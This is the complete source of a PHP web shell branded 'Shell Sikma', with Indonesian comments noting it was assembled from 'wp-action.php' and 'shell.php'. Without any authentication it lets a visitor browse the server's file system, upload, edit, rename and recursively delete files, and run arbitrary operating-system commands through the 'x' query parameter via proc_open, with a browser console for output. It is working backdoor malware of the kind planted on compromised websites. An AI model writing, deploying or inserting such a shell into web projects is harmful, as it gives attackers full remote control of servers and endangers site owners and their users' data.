<?php

$path = realpath(isset($_GET['path']) ? $_GET['path'] : '.');
if (!$path) {
    $path = realpath('.');
}

function join_paths() {
    $paths = array();
    foreach (func_get_args() as $arg) {
        if ($arg !== '') $paths[] = $arg;
    }
    return preg_replace('#/+#','/',join('/', $paths));
}

function rrmdir($dir) {
    if (is_dir($dir)) {
        $objects = scandir($dir);
        foreach ($objects as $object) {
            if ($object != "." && $object != "..") {
                if (is_dir($dir . DIRECTORY_SEPARATOR . $object) && !is_link($dir . DIRECTORY_SEPARATOR . $object)) {
                    rrmdir($dir . DIRECTORY_SEPARATOR . $object);
                } else {
                    unlink($dir . DIRECTORY_SEPARATOR . $object);
                }
            }
        }
        rmdir($dir);
    } elseif (is_file($dir)) {
        unlink($dir);
    }
}

// Handle create directory
if (isset($_POST['mkdir']) && !empty($_POST['mkdir'])) {
    $newDir = join_paths($path, basename($_POST['mkdir']));
    if (!file_exists($newDir)) {
        mkdir($newDir);
        echo "<div>Directory created: " . htmlspecialchars($newDir) . "</div>";
    } else {
        echo "<div>Directory already exists.</div>";
    }
}

// Handle create file
if (isset($_POST['touch_name']) && !empty($_POST['touch_name'])) {
    $newFile = join_paths($path, basename($_POST['touch_name']));
    if (!file_exists($newFile)) {
        file_put_contents($newFile, "");
        echo "<div>File created: " . htmlspecialchars($newFile) . "</div>";
    } else {
        echo "<div>File already exists.</div>";
    }
}

// Handle file upload
if (isset($_FILES['upload_file'])) {
    $uploadFileName = basename($_FILES['upload_file']['name']);
    $targetFile = join_paths($path, $uploadFileName);
    if(move_uploaded_file($_FILES['upload_file']['tmp_name'], $targetFile)) {
        echo "<div>File uploaded: " . htmlspecialchars($uploadFileName) . "</div>";
    } else {
        echo "<div>Failed to upload file.</div>";
    }
}

// Handle rename file/directory
if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
    $from = join_paths($path, $_POST['rename_from']);
    $to = join_paths($path, basename($_POST['rename_to']));
    if($from !== false && file_exists($from)) {
        if (!file_exists($to)) {
            rename($from, $to);
            echo "<div>Renamed '" . htmlspecialchars($_POST['rename_from']) . "' to '" . htmlspecialchars($_POST['rename_to']) . "'</div>";
        } else {
            echo "<div>Target name already exists.</div>";
        }
    } else {
        echo "<div>Source file/directory does not exist.</div>";
    }
}

// Handle file/directory delete
if (isset($_POST['delete_name']) && isset($_POST['confirm_delete'])) {
    $deletePath = join_paths($path, $_POST['delete_name']);
    if ($deletePath !== false && file_exists($deletePath)) {
        rrmdir($deletePath);
        echo "<div>Deleted: " . htmlspecialchars($_POST['delete_name']) . "</div>";
    } else {
        echo "<div>File/Directory does not exist.</div>";
    }
} elseif (isset($_POST['delete_name']) && !isset($_POST['confirm_delete'])) {
    echo "<div>Delete confirmation required.</div>";
    exit;
}

// Handle file editing
if (isset($_GET['edit'])) {
    $fileToEdit = join_paths($path, $_GET['edit']);
    
    if (isset($_POST['file_content'])) {
        // Save file content
        if (file_put_contents($fileToEdit, $_POST['file_content']) !== false) {
            echo "<div style='color: green; background: #222; padding: 10px; margin: 10px 0;'>File saved successfully!</div>";
            // Redirect back to avoid resubmission
            header("Location: ?path=" . urlencode($path));
            exit;
        } else {
            echo "<div style='color: red; background: #222; padding: 10px; margin: 10px 0;'>Failed to save file!</div>";
        }
    }
    
    // Read file content
    $content = '';
    if (file_exists($fileToEdit) && is_file($fileToEdit)) {
        $content = file_get_contents($fileToEdit);
    }
    
    // Display editor popup
    echo '
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Edit: ' . esc($_GET['edit']) . '</title>
        <style>
            body {
                font-family: monospace;
                background: #1e1e1e;
                color: #fff;
                margin: 0;
                padding: 20px;
            }
            .editor-container {
                background: #2d2d2d;
                border: 1px solid #444;
                border-radius: 5px;
                padding: 15px;
                max-width: 1000px;
                margin: 0 auto;
            }
            textarea {
                width: 100%;
                height: 500px;
                background: #1e1e1e;
                color: #d4d4d4;
                border: 1px solid #444;
                padding: 10px;
                font-family: monospace;
                font-size: 14px;
                resize: vertical;
                box-sizing: border-box;
            }
            .button-group {
                margin-top: 10px;
                text-align: right;
            }
            button {
                background: #007acc;
                color: white;
                border: none;
                padding: 8px 16px;
                margin-left: 5px;
                cursor: pointer;
                border-radius: 3px;
                font-family: monospace;
            }
            button:hover {
                background: #005a9e;
            }
            .cancel-btn {
                background: #555;
            }
            .cancel-btn:hover {
                background: #777;
            }
            h3 {
                color: #fff;
                margin-top: 0;
                border-bottom: 1px solid #444;
                padding-bottom: 10px;
            }
            .file-info {
                color: #888;
                font-size: 12px;
                margin-bottom: 10px;
            }
        </style>
    </head>
    <body>
        <div class="editor-container">
            <h3>Editing: ' . esc($_GET['edit']) . '</h3>
            <div class="file-info">
                Path: ' . esc($fileToEdit) . ' | Size: ' . (file_exists($fileToEdit) ? filesize($fileToEdit) : 0) . ' bytes
            </div>
            <form method="POST">
                <textarea name="file_content" placeholder="File content..." spellcheck="false">' . esc($content) . '</textarea>
                <div class="button-group">
                    <button type="button" class="cancel-btn" onclick="window.close()">Cancel</button>
                    <button type="submit">Save File</button>
                </div>
            </form>
        </div>
        <script>
            // Auto-focus textarea
            document.querySelector("textarea").focus();
            
            // Handle Ctrl+S to save
            document.addEventListener("keydown", function(e) {
                if ((e.ctrlKey || e.metaKey) && e.key === "s") {
                    e.preventDefault();
                    document.querySelector("form").submit();
                }
            });
            
            // Auto-resize textarea to fit content
            const textarea = document.querySelector("textarea");
            textarea.addEventListener("input", function() {
                this.style.height = "auto";
                this.style.height = (this.scrollHeight) + "px";
            });
            
            // Initial resize
            textarea.style.height = (textarea.scrollHeight) + "px";
        </script>
    </body>
    </html>';
    exit;
}

function esc($str) {
    return htmlspecialchars($str);
}

// --- Akhir fungsi dari wp-action.php ---

// --- Mulai fungsi dari shell.php ---
// Menggunakan mekanisme eksekusi perintah cmd dari shell.php

if (isset($_GET['x'])) {
    $descriptorspec = array(
        0 => array("pipe", "r"),  // stdin
        1 => array("pipe", "w"),  // stdout
        2 => array("pipe", "w")   // stderr
    );

    $cmd = $_GET['x'];
    
    // Change to the current directory before executing command
    $old_cwd = getcwd();
    chdir($path);
    
    $process = proc_open($cmd, $descriptorspec, $pipes);

    if (is_resource($process)) {
        echo stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        proc_close($process);
    }
    
    // Restore original directory
    chdir($old_cwd);
    exit;
}
// --- Akhir fungsi dari shell.php ---


// --- Mulai tampilan seperti by.php ---

?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Shell Sikma</title>
<style>
/* Contoh style sederhana, bisa disesuaikan dengan by.php */
body {
    font-family: monospace;
    background-color: #121212;
    color: #ffffff;
    margin: 0; padding: 0;
}
header, footer {
    background-color: #222;
    padding: 10px;
    text-align: center;
}
.container {
    padding: 20px;
}
button, input[type=text], input[type=file] {
    background-color: #333;
    border: none;
    color: #fff;
    padding: 5px 10px;
    margin: 2px;
    font-family: monospace;
}
table {
    border-collapse: collapse;
    width: 100%;
}
th, td {
    border: 1px solid #444;
    padding: 8px;
    text-align: left;
}
a {
    color: #4a90e2;
    text-decoration: none;
}
a:hover {
    text-decoration: underline;
}
.path-links {
    margin-bottom: 15px;
    padding: 10px;
    background: #222;
    border-radius: 5px;
}
.path-links a {
    color: #4a90e2;
}
.path-links a:hover {
    color: #7ab6ff;
}
.current-dir {
    background: #333;
    padding: 5px 10px;
    margin-bottom: 10px;
    border-radius: 3px;
    font-family: monospace;
}
/* Modal Rename Styles */
.modal {
    display: none;
    position: fixed;
    z-index: 1000;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0,0,0,0.7);
}
.modal-content {
    background-color: #2d2d2d;
    margin: 15% auto;
    padding: 20px;
    border: 1px solid #444;
    border-radius: 5px;
    width: 400px;
    max-width: 90%;
}
.modal-header {
    border-bottom: 1px solid #444;
    padding-bottom: 10px;
    margin-bottom: 15px;
}
.modal-footer {
    border-top: 1px solid #444;
    padding-top: 15px;
    margin-top: 15px;
    text-align: right;
}
.modal-input {
    width: 100%;
    padding: 8px;
    margin-bottom: 15px;
    background: #1e1e1e;
    border: 1px solid #444;
    color: #fff;
    font-family: monospace;
    box-sizing: border-box;
}
</style>
</head>
<body>
<header>
    <h1>Shell Sikma</h1>
</header>
<div class="container">

<?php
// Menampilkan breadcrumb path dengan link
echo "<div class='path-links'>";
echo "<strong>Path: </strong>";
$pathParts = explode('/', trim($path, '/'));
$currentPath = '';
foreach ($pathParts as $index => $part) {
    if ($part === '') continue;
    $currentPath .= '/' . $part;
    if ($index < count($pathParts) - 1) {
        echo "<a href='?path=" . urlencode($currentPath) . "'>" . esc($part) . "</a>/";
    } else {
        echo esc($part);
    }
}
echo "</div>";

// Menampilkan daftar file & folder di direktori saat ini ($path)
echo "<h3>Directory: " . esc($path) . "</h3>";
echo "<table>";
echo "<tr><th>Name</th><th>Size</th><th>Actions</th></tr>";

$files = scandir($path);
if ($files === false) {
    echo "<tr><td colspan='3'>Unable to read directory!</td></tr>";
} else {
    foreach ($files as $file) {
        if ($file === '.') continue;
        $fullPath = join_paths($path, $file);
        $size = is_file($fullPath) ? filesize($fullPath) : '--';
        echo "<tr>";
        echo "<td>";
        if (is_dir($fullPath)) {
            echo "<a href='?path=" . urlencode($fullPath) . "'>" . esc($file) . "/</a>";
        } else {
            echo esc($file);
        }
        echo "</td>";
        echo "<td>" . esc($size) . "</td>";
        echo "<td>
            <button onclick=\"showRenameModal('" . esc($file) . "')\">Rename</button>
            <form style='display:inline' method='POST'>
                <input type='hidden' name='delete_name' value='" . esc($file) . "'/>
                <button type='submit' name='confirm_delete' value='1'>Delete</button>
            </form>
            <button onclick=\"window.open('?edit=" . urlencode($file) . "&path=" . urlencode($path) . "', 'editWindow', 'width=900,height=700,resizable=yes,scrollbars=yes')\">Edit</button>
        </td>";
        echo "</tr>";
    }
}
echo "</table>";

// Form bikin folder baru
?>
<h3>Create New Folder</h3>
<form method="POST">
    <input type="text" name="mkdir" placeholder="Folder Name" required/>
    <button type="submit">Create</button>
</form>

<h3>Create New File</h3>
<form method="POST">
    <input type="text" name="touch_name" placeholder="File Name" required/>
    <button type="submit">Create</button>
</form>

<h3>Upload File</h3>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="upload_file" required/>
    <button type="submit">Upload</button>
</form>

<!-- Modal Rename -->
<div id="renameModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>Rename File/Folder</h3>
        </div>
        <form method="POST" id="renameForm">
            <input type="hidden" name="rename_from" id="renameFrom">
            <input type="text" class="modal-input" name="rename_to" id="renameTo" placeholder="Enter new name" required>
            <div class="modal-footer">
                <button type="button" onclick="closeRenameModal()" style="background: #555;">Cancel</button>
                <button type="submit">Rename</button>
            </div>
        </form>
    </div>
</div>

<h3>Command Execution</h3>
<div class="current-dir">
    Current Directory: <?php echo esc($path); ?>
</div>
<form id="cmdForm">
    <input type="text" id="cmdInput" placeholder="Enter command (runs in: <?php echo esc($path); ?>)" style="width: 80%;" />
    <button type="submit">Execute</button>
</form>
<div id="cmdOutput" style="background: #000; color: #fff; padding: 10px; margin-top: 10px; min-height: 200px; font-family: monospace; white-space: pre-wrap;"></div>

<script>
// Rename Modal Functions
function showRenameModal(filename) {
    document.getElementById('renameFrom').value = filename;
    document.getElementById('renameTo').value = filename;
    document.getElementById('renameModal').style.display = 'block';
    document.getElementById('renameTo').focus();
    document.getElementById('renameTo').select();
}

function closeRenameModal() {
    document.getElementById('renameModal').style.display = 'none';
}

// Close modal when clicking outside
window.onclick = function(event) {
    const modal = document.getElementById('renameModal');
    if (event.target == modal) {
        closeRenameModal();
    }
}

// Handle Enter key in rename modal
document.getElementById('renameTo').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        document.getElementById('renameForm').submit();
    }
});

// Command execution
document.getElementById('cmdForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const cmdInput = document.getElementById('cmdInput');
    const cmdOutput = document.getElementById('cmdOutput');
    const command = cmdInput.value.trim();
    
    if (!command) return;
    
    // Tambahkan command ke output dengan info current path
    cmdOutput.innerHTML += '<span style="color: #4a90e2">' + '<?php echo esc($path); ?>' + '</span> <span style="color: #fff">$ ' + command + '</span>\n';
    
    // Eksekusi command via AJAX dengan path parameter
    const xhr = new XMLHttpRequest();
    xhr.open('GET', '?x=' + encodeURIComponent(command) + '&path=<?php echo urlencode($path); ?>', true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            // Tambahkan output ke div
            if (xhr.responseText) {
                cmdOutput.innerHTML += xhr.responseText + '\n';
            } else {
                cmdOutput.innerHTML += '\n';
            }
            
            // Scroll ke bawah
            cmdOutput.scrollTop = cmdOutput.scrollHeight;
            
            // Kosongkan input
            cmdInput.value = '';
        }
    };
    xhr.send();
    
    // Focus kembali ke input
    cmdInput.focus();
});

// Auto-focus command input
document.getElementById('cmdInput').focus();
</script>

</div>
<footer>
    <small>Shell Sikma &copy; 2025</small>
</footer>
</body>
</html>